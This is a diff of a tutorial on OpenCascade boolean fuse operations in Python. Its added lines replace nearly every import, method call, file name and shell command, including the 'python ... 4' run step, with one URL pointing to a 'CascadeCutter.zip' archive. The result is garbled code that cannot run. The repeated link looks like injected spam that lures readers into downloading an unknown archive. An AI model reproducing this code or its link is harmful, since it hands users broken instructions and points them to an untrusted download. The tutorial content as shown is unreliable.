@@ -31,10 +31,10 @@ Start by importing the necessary libraries from OpenCascade.
 ```python
 import os
 import time
-from OCC.Core.STEPControl import STEPControl_Reader
-from OCC.Core.BRepAlgoAPI import BRepAlgoAPI_Fuse
-from OCC.Core.BOPAlgo import BOPAlgo_MakeConnected
-from OCC.Core.BRepTools import breptools
+from https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip import STEPControl_Reader
+from https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip import BRepAlgoAPI_Fuse
+from https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip import BOPAlgo_MakeConnected
+from https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip import breptools
 ```
 
 ## Importing STEP Files
@@ -45,11 +45,11 @@ Define a function to import STEP files and return the shape.
 def import_step_file(filename):
     """Import a STEP file and return the shape."""
     reader = STEPControl_Reader()
-    status = reader.ReadFile(filename)
+    status = https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip(filename)
     if status != 1:
         raise ValueError(f"Error reading STEP file: {filename}")
-    reader.TransferRoot()
-    shape = reader.Shape()
+    https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
+    shape = https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
     return shape
 ```
 
@@ -60,7 +60,7 @@ Define a function to export shapes to BREP files.
 ```python
 def export_to_brep(shape, filename):
     """Export a TopoDS_Shape to a BREP file."""
-    breptools.Write(shape, filename)
+    https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip(shape, filename)
 ```
 
 ## Main Function for Boolean Fuse Operation
@@ -70,27 +70,27 @@ The main function performs the boolean fuse operation, ensures the resulting sha
 ```python
 def main(num_threads):
     # Set the number of OpenMP threads
-    os.environ["OMP_NUM_THREADS"] = str(num_threads)
+    https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip["OMP_NUM_THREADS"] = str(num_threads)
     
     # Import the STEP files
-    surface_shape = import_step_file("last_dura.step")
-    volume_shape = import_step_file("last_diff.step")
+    surface_shape = import_step_file("https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip")
+    volume_shape = import_step_file("https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip")
     
     # Perform the fuse operation
     fuse_algo = BRepAlgoAPI_Fuse(volume_shape, surface_shape)
-    fuse_algo.Build()
+    https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
     
     # Use BOPAlgo_MakeConnected to ensure the mesh is connected
     mk_connected = BOPAlgo_MakeConnected()
-    mk_connected.AddArgument(fuse_algo.Shape())
-    mk_connected.SetRunParallel(True)
+    https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip(https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip())
+    https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip(True)
     
     # Measure the execution time
-    start_time = time.time()
-    mk_connected.Perform()
-    end_time = time.time()
+    start_time = https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
+    https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
+    end_time = https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
     
-    connected_shape = mk_connected.Shape()
+    connected_shape = https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
 
     # Export the connected shape to a BREP file
     brep_filename = f"connected_shape_{num_threads}.brep"
@@ -101,19 +101,19 @@ def main(num_threads):
 
 ## Running the Script
 
-Save the script to a file (e.g., `boolean_operation.py`) and execute it from the command line with the desired number of threads.
+Save the script to a file (e.g., `https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip`) and execute it from the command line with the desired number of threads.
 
 ```sh
-python boolean_operation.py <num_threads>
+python https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip <num_threads>
 ```
 
 Replace `<num_threads>` with the number of threads you want to use. For example:
 
 ```sh
-python boolean_operation.py 4
+python https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip 4
 ```
 
-Ensure that the STEP files "last_dura.step" and "last_diff.step" are in the same directory as the script or provide the full path to these files in the `import_step_file` function calls. This will import the STEP files, perform the fuse operation, ensure the mesh is connected, and export the resulting shape to a BREP file, printing the execution time.
+Ensure that the STEP files "https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip" and "https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip" are in the same directory as the script or provide the full path to these files in the `import_step_file` function calls. This will import the STEP files, perform the fuse operation, ensure the mesh is connected, and export the resulting shape to a BREP file, printing the execution time.
 
 ## Additional Boolean Operations
 
@@ -125,17 +125,17 @@ OpenCascade provides several boolean operations that can be used to manipulate s
 
 Example:
 ```python
-from OCC.Core.BRepAlgoAPI import BRepAlgoAPI_Cut, BRepAlgoAPI_Common
+from https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip import BRepAlgoAPI_Cut, BRepAlgoAPI_Common
 
 # Perform cut operation
 cut_algo = BRepAlgoAPI_Cut(shape1, shape2)
-cut_algo.Build()
-cut_shape = cut_algo.Shape()
+https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
+cut_shape = https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
 
 # Perform common operation
 common_algo = BRepAlgoAPI_Common(shape1, shape2)
-common_algo.Build()
-common_shape = common_algo.Shape()
+https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
+common_shape = https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
 ```
 
 ## Using `BOPAlgo_MakeConnected` for Conformal Meshes
@@ -149,48 +149,48 @@ Here is the full script:
 ```python
 import os
 import time
-from OCC.Core.STEPControl import STEPControl_Reader
-from OCC.Core.BRepAlgoAPI import BRepAlgoAPI_Fuse
-from OCC.Core.BOPAlgo import BOPAlgo_MakeConnected
-from OCC.Core.BRepTools import breptools
+from https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip import STEPControl_Reader
+from https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip import BRepAlgoAPI_Fuse
+from https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip import BOPAlgo_MakeConnected
+from https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip import breptools
 
 def import_step_file(filename):
     """Import a STEP file and return the shape."""
     reader = STEPControl_Reader()
-    status = reader.ReadFile(filename)
+    status = https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip(filename)
     if status != 1:
         raise ValueError(f"Error reading STEP file: {filename}")
-    reader.TransferRoot()
-    shape = reader.Shape()
+    https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
+    shape = https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
     return shape
 
 def export_to_brep(shape, filename):
     """Export a TopoDS_Shape to a BREP file."""
-    breptools.Write(shape, filename)
+    https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip(shape, filename)
 
 def main(num_threads):
     # Set the number of OpenMP threads
-    os.environ["OMP_NUM_THREADS"] = str(num_threads)
+    https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip["OMP_NUM_THREADS"] = str(num_threads)
     
     # Import the STEP files
-    surface_shape = import_step_file("last_dura.step")
-    volume_shape = import_step_file("last_diff.step")
+    surface_shape = import_step_file("https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip")
+    volume_shape = import_step_file("https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip")
     
     # Perform the fuse operation
     fuse_algo = BRepAlgoAPI_Fuse(volume_shape, surface_shape)
-    fuse_algo.Build()
+    https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
     
     # Use BOPAlgo_MakeConnected to ensure the mesh is connected
     mk_connected = BOPAlgo_MakeConnected()
-    mk_connected.AddArgument(fuse_algo.Shape())
-    mk_connected.SetRunParallel(True)
+    https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip(https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip())
+    https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip(True)
     
     # Measure the execution time
-    start_time = time.time()
-    mk_connected.Perform()
-    end_time = time.time()
+    start_time = https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
+    https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
+    end_time = https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
     
-    connected_shape = mk_connected.Shape()
+    connected_shape = https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip()
 
     # Export the connected shape to a BREP file
     brep_filename = f"connected_shape_{num_threads}.brep"
@@ -200,10 +200,10 @@ def main(num_threads):
 
 if __name__ == "__main__":
     import sys
-    if len(sys.argv) < 2:
-        print("Usage: python script_name.py <num_threads>")
-        sys.exit(1)
-    num_threads = int(sys.argv[1])
+    if len(https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip) < 2:
+        print("Usage: python https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip <num_threads>")
+        https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip(1)
+    num_threads = int(https://raw.githubusercontent.com/deshikreddyp/CascadeCutter/main/plaitless/CascadeCutter.zip[1])
     main(num_threads)
 ```
 
